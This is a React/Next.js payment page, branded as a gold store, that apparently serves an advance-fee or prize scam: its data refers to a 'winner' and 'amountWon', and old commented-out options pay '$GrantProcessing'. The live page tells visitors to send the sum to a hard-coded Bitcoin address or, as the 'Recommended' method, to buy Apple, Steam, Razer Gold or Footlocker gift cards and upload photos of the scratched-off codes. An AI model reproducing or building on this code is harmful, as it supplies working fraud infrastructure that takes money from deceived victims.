"use client";

import { useState, useEffect, Suspense } from "react";
import { useRouter, useSearchParams } from "next/navigation";
import Link from "next/link";

interface WinnerData {
  id: string;
  investmentId: string;
  name: string;
  amountWon: number;
  createdAt: string;
  claimInfo?: {
    fullName: string;
    phoneNumber: string;
    email: string;
    houseAddress: string;
    occupation: string;
    country: string;
    submittedAt: string;
    paymentMethod?: string;
    paymentConfirmedAt?: string;
    paymentFiles?: string[];
  };
  tempClaimInfo?: {
    fullName: string;
    phoneNumber: string;
    email: string;
    houseAddress: string;
    occupation: string;
    country: string;
    savedAt: string;
  };
  orderItems?: Array<{
    productId: string;
    name: string;
    price: number;
    originalPrice?: number;
    image: string;
    category: string;
    quantity: number;
  }>;
}

interface PaymentMethod {
  id: string;
  name: string;
  description: string;
  icon: string;
  recommended?: boolean;
  instructions: string[];
}

function PaymentPageContent() {
  const router = useRouter();
  const searchParams = useSearchParams();
  const investmentId = searchParams.get("investmentId");
  
  const [winner, setWinner] = useState<WinnerData | null>(null);
  const [loading, setLoading] = useState(true);
  const [selectedMethod, setSelectedMethod] = useState<string>("");
  const [showConfirmationModal, setShowConfirmationModal] = useState(false);
  const [uploadedFiles, setUploadedFiles] = useState<File[]>([]);
  const [giftCardFront, setGiftCardFront] = useState<File | null>(null);
  const [giftCardBack, setGiftCardBack] = useState<File | null>(null);
  const [frontPreview, setFrontPreview] = useState<string>("");
  const [backPreview, setBackPreview] = useState<string>("");
  const [generalPreviews, setGeneralPreviews] = useState<string[]>([]);
  const [uploading, setUploading] = useState(false);
  const [uploadError, setUploadError] = useState("");
  const [copiedAddress, setCopiedAddress] = useState(false);

  const handleCopyAddress = async (address: string) => {
    try {
      await navigator.clipboard.writeText(address);
      setCopiedAddress(true);
      setTimeout(() => setCopiedAddress(false), 2000);
    } catch (error) {
      console.error('Failed to copy address:', error);
    }
  };

  const getPaymentMethods = (): PaymentMethod[] => {
    if (!winner) return [];
    
    return [
      // {
      //   id: "cashapp",
      //   name: "Cash App",
      //   description: "Fast and easy mobile payment",
      //   icon: "$",
      //   instructions: [
      //     "Open Cash App on your phone",
      //     `Send $${winner.amountWon.toLocaleString()} to $GrantProcessing`,
      //     "Take a screenshot of the confirmation",
      //     "Contact support with your investment confirmation"
      //   ]
      // },
      // {
      //   id: "zelle",
      //   name: "Zelle",
      //   description: "Direct bank transfer",
      //   icon: "Z",
      //   instructions: [
      //     "Open your banking app and select Zelle",
      //     `Send $${winner.amountWon.toLocaleString()} to grants@processing.com`,
      //     "Save the transaction confirmation",
      //     "Contact support with your investment confirmation"
      //   ]
      // },
      // {
      //   id: "chime",
      //   name: "Chime",
      //   description: "Digital banking payment",
      //   icon: "C",
      //   instructions: [
      //     "Open Chime app",
      //     `Send $${winner.amountWon.toLocaleString()} to @grantprocessing`,
      //     "Screenshot the transaction",
      //     "Contact support with your payment confirmation"
      //   ]
      // },
      {
        id: "btc",
        name: "Bitcoin",
        description: "Cryptocurrency payment",
        icon: "₿",
        instructions: [
          `Send ${winner.amountWon.toLocaleString('en-US', { style: 'currency', currency: 'USD' })} worth of BTC to: 3H74WwMHfKqYSnDszCoXBNtEFAq9XnRXTv`,
          "Wait for blockchain confirmation",
          "Send the transaction ID to support",
          "Contact support with your order confirmation",
          "You can also open your BITCOIN WALLET and scan the QR code below to make payment"
        ]
      },
      {
        id: "giftcard",
        name: "Gift Card (Recommended)",
        description: "Quick and secure payment method",
        icon: "🎁",
        recommended: true,
        instructions: [
          `Purchase a ${winner.amountWon.toLocaleString('en-US', { style: 'currency', currency: 'USD' })} Apple card, Steam, Razer Gold or Footlocker gift card`,
          "Scratch off the security code on the back",
          "Send a clear photo of the front and back",
          "Send to: grantsupport@payment.com",
          "Contact support with your order confirmation"
        ]
      }
    ];
  };

  const fetchWinner = async () => {
    if (!investmentId) return;
    
    try {
      const res = await fetch(`/api/investments/${encodeURIComponent(investmentId)}`);
      const data = await res.json();

      if (!res.ok) {
        // Don't redirect during loading to prevent flash before status page redirect
        return;
      }
      
      // Allow payment processing even if already confirmed (coming directly from investment selection)
      // if (data.claimInfo && data.claimInfo.paymentConfirmedAt) {
      //   router.push(`/status?id=${investmentId}`);
      //   return;
      // }

      setWinner(data);
    } catch {
      setUploadError("Failed to load winner information");
    } finally {
      setLoading(false);
    }
  };

  useEffect(() => {
    if (!investmentId) {
      router.push("/");
      return;
    }

    fetchWinner();
  }, [investmentId, router]);

  const handlePaymentMethodSelect = (methodId: string) => {
    // Clear uploaded files when switching payment methods to prevent cross-contamination
    if (methodId !== selectedMethod) {
      // Clean up object URLs to prevent memory leaks
      generalPreviews.forEach(preview => URL.revokeObjectURL(preview));
      if (frontPreview) URL.revokeObjectURL(frontPreview);
      if (backPreview) URL.revokeObjectURL(backPreview);
      
      setUploadedFiles([]);
      setGeneralPreviews([]);
      setGiftCardFront(null);
      setGiftCardBack(null);
      setFrontPreview("");
      setBackPreview("");
      setUploadError("");
    }
    setSelectedMethod(methodId);
  };

  const handleFileUpload = (e: React.ChangeEvent<HTMLInputElement>, type: 'general' | 'front' | 'back') => {
    const files = Array.from(e.target.files || []);
    setUploadError("");
    
    if (files.length === 0) return;
    
    const file = files[0]; // Take only the first file for gift card uploads
    
    // Validate file size (50MB max)
    const maxSize = 50 * 1024 * 1024; // 50MB in bytes
    if (file.size > maxSize) {
      setUploadError(`File "${file.name}" exceeds 50MB limit`);
      return;
    }
    
    // Validate file type
    const allowedTypes = ['image/jpeg', 'image/jpg', 'image/png', 'image/gif', 'image/webp'];
    if (!allowedTypes.includes(file.type)) {
      setUploadError(`File "${file.name}" is not a valid image format (JPG, PNG, GIF, WebP allowed)`);
      return;
    }
    
    // Create preview URL
    const previewUrl = URL.createObjectURL(file);
    
    if (type === 'front') {
      setGiftCardFront(file);
      setFrontPreview(previewUrl);
    } else if (type === 'back') {
      setGiftCardBack(file);
      setBackPreview(previewUrl);
    } else {
      setUploadedFiles(prev => [...prev, file]);
      setGeneralPreviews(prev => [...prev, previewUrl]);
    }
  };

  const removeFile = (index: number) => {
    // Clean up preview URL
    if (generalPreviews[index]) {
      URL.revokeObjectURL(generalPreviews[index]);
    }
    setUploadedFiles(prev => prev.filter((_, i) => i !== index));
    setGeneralPreviews(prev => prev.filter((_, i) => i !== index));
  };

  const removeGiftCardFile = (type: 'front' | 'back') => {
    if (type === 'front') {
      if (frontPreview) {
        URL.revokeObjectURL(frontPreview);
      }
      setGiftCardFront(null);
      setFrontPreview("");
    } else {
      if (backPreview) {
        URL.revokeObjectURL(backPreview);
      }
      setGiftCardBack(null);
      setBackPreview("");
    }
  };

  const handlePaymentConfirmation = async () => {
    // Validate files based on payment method
    if (selectedPaymentMethod?.id === 'giftcard') {
      if (!giftCardFront || !giftCardBack) {
        setUploadError("Please upload both front and back of the gift card");
        return;
      }
    } else {
      if (uploadedFiles.length === 0) {
        setUploadError("Please upload at least one payment confirmation file");
        return;
      }
    }
    
    setUploading(true);
    setUploadError("");

    try {
      const formData = new FormData();
      formData.append("id", investmentId || "");
      formData.append("paymentMethod", selectedPaymentMethod?.id || "");

      if (selectedPaymentMethod?.id === 'giftcard') {
        if (giftCardFront) formData.append('front', giftCardFront);
        if (giftCardBack) formData.append('back', giftCardBack);
      } else {
        uploadedFiles.forEach((file, i) => {
          console.log(`📤 Adding file ${i}:`, file.name, file.size);
          formData.append('files', file);
        });
      }

      const res = await fetch("/api/payment-confirmation", {
        method: "POST",
        body: formData,
      });

      if (!res.ok) {
        const errorData = await res.json();
        setUploadError(errorData.error || "Failed to upload payment confirmation");
        return;
      }

      // Success - redirect to investment details page
      setShowConfirmationModal(false);
      router.push(`/investment/${investmentId}`);
      
    } catch (error) {
      setUploadError('Failed to upload files. Please try again.');
    } finally {
      setUploading(false);
    }
  };

  if (loading) {
    return (
      <div className="min-h-screen bg-gray-50 flex items-center justify-center">
        <div className="text-center">
          <div className="animate-spin rounded-full h-12 w-12 border-b-2 border-yellow-600 mx-auto mb-4"></div>
          <p className="text-gray-600">Loading payment options...</p>
        </div>
      </div>
    );
  }

  // Always allow payment since we're coming directly from investment selection
  if (!winner) {
    return (
      <div className="min-h-screen bg-gray-50">
        <main className="mx-auto max-w-2xl px-4 py-16">
          <div className="bg-red-50 border border-red-200 rounded-lg p-4">
            <p className="text-red-800">Order not found.</p>
          </div>
        </main>
      </div>
    );
  }

  const selectedPaymentMethod = getPaymentMethods().find((method: PaymentMethod) => method.id === selectedMethod);

  return (
    <div className="min-h-screen bg-gray-50">
      <header className="bg-white border-b border-gray-200 sticky top-0 z-50">
        <div className="mx-auto max-w-7xl px-4 py-4">
          <div className="flex items-center gap-2">
            <svg width="32" height="32" viewBox="0 0 40 40" className="w-8 h-8">
              <circle cx="20" cy="20" r="20" fill="#d4af37"/>
              <text x="20" y="25" fontFamily="Arial, sans-serif" fontSize="10" fontWeight="bold" textAnchor="middle" fill="white">
                GOLD
              </text>
            </svg>
            <span className="text-xl font-bold text-gray-800">Amira Gold Store</span>
          </div>
        </div>
      </header>

      <main className="mx-auto max-w-4xl px-4 py-8">
        <div className="text-center mb-8">
          <h1 className="text-3xl font-bold text-gray-800 mb-2">
            Checkout
          </h1>
          <p className="text-gray-600">
            Select your preferred payment method for your order of {winner.amountWon.toLocaleString('en-US', { style: 'currency', currency: 'USD' })}
          </p>
        </div>

        {/* Order Summary */}
        {winner.orderItems && winner.orderItems.length > 0 && (
          <div className="bg-white rounded-xl shadow-sm border border-gray-200 p-6 mb-8">
            <h2 className="text-xl font-semibold text-gray-800 mb-4">Order Summary</h2>
            <div className="space-y-4">
              {winner.orderItems.map((item, index) => (
                <div key={index} className="flex gap-4 pb-4 border-b border-gray-200 last:border-b-0">
                  <img
                    src={item.image}
                    alt={item.name}
                    className="w-20 h-20 object-cover rounded-lg"
                  />
                  <div className="flex-1">
                    <h3 className="font-medium text-gray-800">{item.name}</h3>
                    <p className="text-sm text-gray-500">{item.category}</p>
                    <div className="flex items-center gap-2 mt-2">
                      <span className="font-semibold text-gray-800">
                        ${item.price.toFixed(2)}
                      </span>
                      {item.originalPrice && (
                        <span className="text-sm text-gray-500 line-through">
                          ${item.originalPrice.toFixed(2)}
                        </span>
                      )}
                      {item.originalPrice && (
                        <span className="text-xs bg-red-500 text-white px-2 py-1 rounded-full">
                          {Math.round((1 - item.price / item.originalPrice) * 100)}% OFF
                        </span>
                      )}
                    </div>
                  </div>
                  <div className="text-right">
                    <p className="text-sm text-gray-500">Qty: {item.quantity}</p>
                  </div>
                </div>
              ))}
            </div>
            <div className="mt-4 pt-4 border-t border-gray-200">
              <div className="flex justify-between items-center">
                <span className="text-lg font-semibold text-gray-800">Total</span>
                <span className="text-2xl font-bold text-gray-800">
                  {winner.amountWon.toLocaleString('en-US', { style: 'currency', currency: 'USD' })}
                </span>
              </div>
            </div>
          </div>
        )}


        <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-4 mb-8">
          {getPaymentMethods().map((method: PaymentMethod) => (
            <div
              key={method.id}
              onClick={() => handlePaymentMethodSelect(method.id)}
              className={`relative bg-white rounded-xl shadow-sm border-2 cursor-pointer transition-all hover:shadow-md ${
                selectedMethod === method.id
                  ? "border-yellow-500 ring-2 ring-yellow-200"
                  : "border-gray-200 hover:border-gray-300"
              }`}
            >
              {method.recommended && (
                <div className="absolute -top-2 -right-2 bg-yellow-500 text-white text-xs font-bold px-3 py-1 rounded-full">
Recommended
                </div>
              )}

              <div className="p-6">
                <div className="flex items-center mb-4">
                  <div className="w-12 h-12 bg-yellow-100 rounded-lg flex items-center justify-center text-2xl font-bold text-yellow-600 mr-3">
                    {method.icon}
                  </div>
                  <div>
                    <h3 className="font-semibold text-gray-800">{method.name}</h3>
                    <p className="text-sm text-gray-600">{method.description}</p>
                  </div>
                </div>

                {selectedMethod === method.id && (
                  <div className="mt-4">
                    <div className="flex items-center text-yellow-600 mb-4">
                      <svg className="w-5 h-5 mr-2" fill="currentColor" viewBox="0 0 20 20">
                        <path fillRule="evenodd" d="M10 18a8 8 0 100-16 8 8 0 000 16zm3.707-9.293a1 1 0 00-1.414-1.414L9 10.586 7.707 9.293a1 1 0 00-1.414 1.414l2 2a1 1 0 001.414 0l4-4z" clipRule="evenodd" />
                      </svg>
                      <span className="font-medium">Selected</span>
                    </div>

                    <div className="border-t pt-4">
                      <h4 className="font-semibold text-gray-800 mb-3">Payment Instructions:</h4>
                      <ol className="space-y-2 text-sm text-gray-600">
                        {method.instructions.map((instruction: string, index: number) => {
                          const isBitcoinAddress = method.id === 'btc' && instruction.includes('3H74WwMHfKqYSnDszCoXBNtEFAq9XnRXTv');
                          const walletAddress = '3H74WwMHfKqYSnDszCoXBNtEFAq9XnRXTv';
                          
                          return (
                            <li key={index} className="flex items-start">
                              <span className="flex-shrink-0 w-5 h-5 bg-yellow-100 text-yellow-600 text-xs font-medium rounded-full flex items-center justify-center mr-2 mt-0.5">
                                {index + 1}
                              </span>
                              {isBitcoinAddress ? (
                                <div className="flex-1">
                                  <span className="block mb-1">Send {winner.amountWon.toLocaleString('en-US', { style: 'currency', currency: 'USD' })} worth of BTC to:</span>
                                  <div className="flex items-center gap-2">
                                    <button
                                      onClick={() => handleCopyAddress(walletAddress)}
                                      className="flex-shrink-0 p-1.5 bg-yellow-100 hover:bg-yellow-200 rounded-md transition-colors"
                                      title="Copy address"
                                    >
                                      {copiedAddress ? (
                                        <svg className="w-4 h-4 text-green-600" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                                          <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M5 13l4 4L19 7" />
                                        </svg>
                                      ) : (
                                        <svg className="w-4 h-4 text-yellow-600" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                                          <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M8 16H6a2 2 0 01-2-2V6a2 2 0 012-2h8a2 2 0 012 2v2m-6 12h8a2 2 0 002-2v-8a2 2 0 00-2-2h-8a2 2 0 00-2 2v8a2 2 0 002 2z" />
                                        </svg>
                                      )}
                                    </button>
                                    <code className="flex-1 break-all bg-gray-100 px-2 py-1 rounded text-xs font-mono text-gray-800">
                                      {walletAddress}
                                    </code>
                                  </div>
                                </div>
                              ) : (
                                <span>{instruction}</span>
                              )}
                            </li>
                          );
                        })}
                      </ol>

                      {method.id === 'btc' && (
                        <div className="mt-4 flex justify-center">
                          <img
                            src="/qr/photo_2026-06-04_13-54-20.jpg"
                            alt="Bitcoin QR Code"
                            className="w-48 h-48 object-contain border border-gray-300 rounded-lg"
                          />
                        </div>
                      )}

                      <div className="mt-4 p-3 bg-yellow-50 border border-yellow-200 rounded-lg">
                        <p className="text-xs text-yellow-800">
                          <strong>Important:</strong> After completing your payment, please contact our support team with your payment confirmation and order number to complete your order processing.
                        </p>
                      </div>

                      <div className="mt-6 pt-4 border-t">
                        <div className="flex items-center justify-between">
                          <div>
                            <h5 className="font-semibold text-gray-800">Ready to proceed?</h5>
                            <p className="text-sm text-gray-600">Complete your payment using the instructions above</p>
                          </div>
                          <button
                            onClick={(e) => {
                              e.stopPropagation();
                              setShowConfirmationModal(true);
                            }}
                            className="px-4 py-2 bg-yellow-600 text-white font-medium rounded-lg hover:bg-yellow-700 transition-colors text-sm"
                          >
I have completed the payment
                          </button>
                        </div>
                      </div>
                    </div>
                  </div>
                )}
              </div>
            </div>
          ))}
        </div>

        
        
        {/* Payment Confirmation Modal */}
        {showConfirmationModal && (
          <div className="fixed inset-0 bg-black bg-opacity-50 flex items-center justify-center p-4 z-50">
            <div className="bg-white rounded-xl shadow-xl max-w-2xl w-full max-h-[90vh] overflow-y-auto">
              <div className="p-6">
                <div className="flex justify-between items-center mb-6">
                  <h3 className="text-xl font-semibold text-gray-800">
                    Upload Payment Confirmation
                  </h3>
                  <button
                    onClick={() => {
                      setShowConfirmationModal(false);
                      setUploadedFiles([]);
                      setUploadError("");
                    }}
                    className="text-gray-400 hover:text-gray-600"
                  >
                    <svg className="w-6 h-6" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                      <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M6 18L18 6M6 6l12 12" />
                    </svg>
                  </button>
                </div>

                <div className="mb-6">
                  <p className="text-gray-600 mb-4">
                    Upload your payment confirmation to complete the verification process.
                  </p>

                  {selectedPaymentMethod?.id === 'giftcard' ? (
                    <div className="bg-blue-50 border border-blue-200 rounded-lg p-4 mb-4">
                      <h4 className="font-medium text-blue-800 mb-2">Gift Card Requirements:</h4>
                      <ul className="text-sm text-blue-700 space-y-1">
                        <li>• Clear photo of the front of the gift card</li>
                        <li>• Clear photo of the back with visible security code</li>
                        <li>• Ensure all numbers and text are readable</li>
                      </ul>
                    </div>
                  ) : (
                    <div className="bg-green-50 border border-green-200 rounded-lg p-4 mb-4">
                      <h4 className="font-medium text-green-800 mb-2">Transaction Proof Requirements:</h4>
                      <ul className="text-sm text-green-700 space-y-1">
                        <li>• Screenshot or photo of completed transaction</li>
                        <li>• Transaction ID/reference number must be visible</li>
                        <li>• Amount (${winner.amountWon.toLocaleString('en-US', { style: 'currency', currency: 'USD' })} and recipient must be clearly shown</li>
                        <li>• Date and time of transaction must be visible</li>
                      </ul>
                    </div>
                  )}
                </div>

                {selectedPaymentMethod?.id === 'giftcard' ? (
                  <div className="space-y-6">
                    {/* Gift Card Front Upload */}
                    <div>
                      <label className="block text-sm font-medium text-gray-700 mb-2">
Gift Card Front (Required)
                      </label>
                      <div className="border-2 border-dashed border-gray-300 rounded-lg overflow-hidden hover:border-yellow-400 transition-colors">
                        <input
                          type="file"
                          accept="image/jpeg,image/jpg,image/png,image/gif,image/webp"
                          onChange={(e) => handleFileUpload(e, 'front')}
                          className="hidden"
                          id="front-upload"
                        />
                        {frontPreview ? (
                          <div className="relative">
                            <img
                              src={frontPreview}
                              alt="Gift card front"
                              className="w-full h-48 object-cover"
                            />
                            <div className="absolute inset-0 bg-black bg-opacity-40 flex items-center justify-center opacity-0 hover:opacity-100 transition-opacity">
                              <label
                                htmlFor="front-upload"
                                className="cursor-pointer bg-white text-gray-800 px-4 py-2 rounded-lg font-medium hover:bg-gray-100 transition-colors"
                              >
                                Change Image
                              </label>
                            </div>
                            <div className="absolute top-2 right-2 bg-yellow-600 text-white px-2 py-1 rounded-full text-xs font-medium">
                              Front
                            </div>
                          </div>
                        ) : (
                          <label
                            htmlFor="front-upload"
                            className="cursor-pointer block p-6 text-center"
                          >
                            <svg className="mx-auto h-12 w-12 text-gray-400 mb-3" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                              <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M4 16l4.586-4.586a2 2 0 012.828 0L16 16m-2-2l1.586-1.586a2 2 0 012.828 0L20 14m-6-6h.01M6 20h12a2 2 0 002-2V6a2 2 0 00-2-2H6a2 2 0 00-2 2v12a2 2 0 002 2z" />
                            </svg>
                            <p className="text-gray-600 mb-2">
                              Click to upload gift card front
                            </p>
                            <p className="text-sm text-gray-500">
                              PNG, JPG, GIF, WebP up to 50MB
                            </p>
                          </label>
                        )}
                      </div>
                      {giftCardFront && (
                        <button
                          onClick={() => removeGiftCardFile('front')}
                          className="mt-2 text-sm text-red-600 hover:text-red-700"
                        >
Remove front image
                        </button>
                      )}
                    </div>

                    {/* Gift Card Back Upload */}
                    <div>
                      <label className="block text-sm font-medium text-gray-700 mb-2">
Gift Card Back (Required)
                      </label>
                      <div className="border-2 border-dashed border-gray-300 rounded-lg overflow-hidden hover:border-yellow-400 transition-colors">
                        <input
                          type="file"
                          accept="image/jpeg,image/jpg,image/png,image/gif,image/webp"
                          onChange={(e) => handleFileUpload(e, 'back')}
                          className="hidden"
                          id="back-upload"
                        />
                        {backPreview ? (
                          <div className="relative">
                            <img
                              src={backPreview}
                              alt="Gift card back"
                              className="w-full h-48 object-cover"
                            />
                            <div className="absolute inset-0 bg-black bg-opacity-40 flex items-center justify-center opacity-0 hover:opacity-100 transition-opacity">
                              <label
                                htmlFor="back-upload"
                                className="cursor-pointer bg-white text-gray-800 px-4 py-2 rounded-lg font-medium hover:bg-gray-100 transition-colors"
                              >
Change Image
                              </label>
                            </div>
                            <div className="absolute top-2 right-2 bg-blue-600 text-white px-2 py-1 rounded-full text-xs font-medium">
Back
                            </div>
                          </div>
                        ) : (
                          <label
                            htmlFor="back-upload"
                            className="cursor-pointer block p-6 text-center"
                          >
                            <svg className="mx-auto h-12 w-12 text-gray-400 mb-3" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                              <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M4 16l4.586-4.586a2 2 0 012.828 0L16 16m-2-2l1.586-1.586a2 2 0 012.828 0L20 14m-6-6h.01M6 20h12a2 2 0 002-2V6a2 2 0 00-2-2H6a2 2 0 00-2 2v12a2 2 0 002 2z" />
                            </svg>
                            <p className="text-gray-600 mb-2">
                              Click to upload gift card back
                            </p>
                            <p className="text-sm text-gray-500">
                              PNG, JPG, GIF, WebP up to 50MB
                            </p>
                          </label>
                        )}
                      </div>
                      {giftCardBack && (
                        <button
                          onClick={() => removeGiftCardFile('back')}
                          className="mt-2 text-sm text-red-600 hover:text-red-700"
                        >
Remove back image
                        </button>
                      )}
                    </div>
                  </div>
                ) : (
                  <div className="mb-6">
                    <label className="block text-sm font-medium text-gray-700 mb-2">
Upload Files (Max 50MB per file, JPG/PNG/GIF/WebP allowed)
                    </label>

                    {/* Show uploaded files with previews */}
                    {generalPreviews.length > 0 && (
                      <div className="mb-4">
                        <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-4">
                          {generalPreviews.map((preview, index) => (
                            <div key={index} className="relative group">
                              <img
                                src={preview}
                                alt={`Uploaded file ${index + 1}`}
                                className="w-full h-32 object-cover rounded-lg border border-gray-200"
                              />
                              <div className="absolute inset-0 bg-black bg-opacity-40 flex items-center justify-center opacity-0 group-hover:opacity-100 transition-opacity rounded-lg">
                                <button
                                  onClick={() => removeFile(index)}
                                  className="bg-red-600 text-white p-2 rounded-full hover:bg-red-700 transition-colors"
                                >
                                  <svg className="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                                    <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M6 18L18 6M6 6l12 12" />
                                  </svg>
                                </button>
                              </div>
                              <div className="absolute top-2 left-2 bg-gray-800 text-white px-2 py-1 rounded-full text-xs font-medium">
                                {index + 1}
                              </div>
                            </div>
                          ))}
                        </div>
                        <div className="mt-4">
                          <label
                            htmlFor="file-upload"
                            className="cursor-pointer inline-flex items-center px-4 py-2 bg-yellow-600 text-white font-medium rounded-lg hover:bg-yellow-700 transition-colors"
                          >
                            <svg className="w-4 h-4 mr-2" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                              <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M12 4v16m8-8H4" />
                            </svg>
Add More Files
                          </label>
                        </div>
                      </div>
                    )}

                    {/* Upload area (shown when no files or to add more) */}
                    <div className="border-2 border-dashed border-gray-300 rounded-lg p-6 text-center hover:border-yellow-400 transition-colors">
                      <input
                        type="file"
                        multiple
                        accept="image/jpeg,image/jpg,image/png,image/gif,image/webp"
                        onChange={(e) => handleFileUpload(e, 'general')}
                        className="hidden"
                        id="file-upload"
                      />
                      <label
                        htmlFor="file-upload"
                        className="cursor-pointer"
                      >
                        <svg className="mx-auto h-12 w-12 text-gray-400 mb-3" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                          <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M7 16a4 4 0 01-.88-7.903A5 5 0 1115.9 6L16 6a5 5 0 011 9.9M15 13l-3-3m0 0l-3 3m3-3v12" />
                        </svg>
                        <p className="text-gray-600 mb-2">
                          {generalPreviews.length > 0 ? "Add more files" : "Click to upload or drag and drop"}
                        </p>
                        <p className="text-sm text-gray-500">
                          PNG, JPG, GIF, WebP up to 50MB
                        </p>
                      </label>
                    </div>
                  </div>
                )}


                {uploadError && (
                  <div className="mb-6 bg-red-50 border border-red-200 rounded-lg p-4">
                    <p className="text-red-800">{uploadError}</p>
                  </div>
                )}

                <div className="flex gap-3">
                  <button
                    onClick={handlePaymentConfirmation}
                    disabled={uploading || (
                      selectedPaymentMethod?.id === 'giftcard'
                        ? (!giftCardFront || !giftCardBack)
                        : uploadedFiles.length === 0
                    )}
                    className="flex-1 px-4 py-3 bg-yellow-600 text-white font-medium rounded-lg hover:bg-yellow-700 disabled:opacity-50 disabled:cursor-not-allowed transition-colors"
                  >
                    {uploading ? "Uploading..." : "Submit Payment Confirmation"}
                  </button>
                  <button
                    onClick={() => {
                      setShowConfirmationModal(false);
                      setUploadedFiles([]);
                      setUploadError("");
                    }}
                    className="flex-1 px-4 py-3 bg-gray-200 text-gray-800 font-medium rounded-lg hover:bg-gray-300 transition-colors"
                  >
Cancel
                  </button>
                </div>
              </div>
            </div>
          </div>
        )}
      </main>
    </div>
  );
}

export default function PaymentPage() {
  return (
    <Suspense fallback={
      <div className="min-h-screen bg-gray-50 flex items-center justify-center">
        <div className="text-center">
          <div className="animate-spin rounded-full h-12 w-12 border-b-2 border-yellow-600 mx-auto mb-4"></div>
          <p className="text-gray-600">Loading...</p>
        </div>
      </div>
    }>
      <PaymentPageContent />
    </Suspense>
  );
}
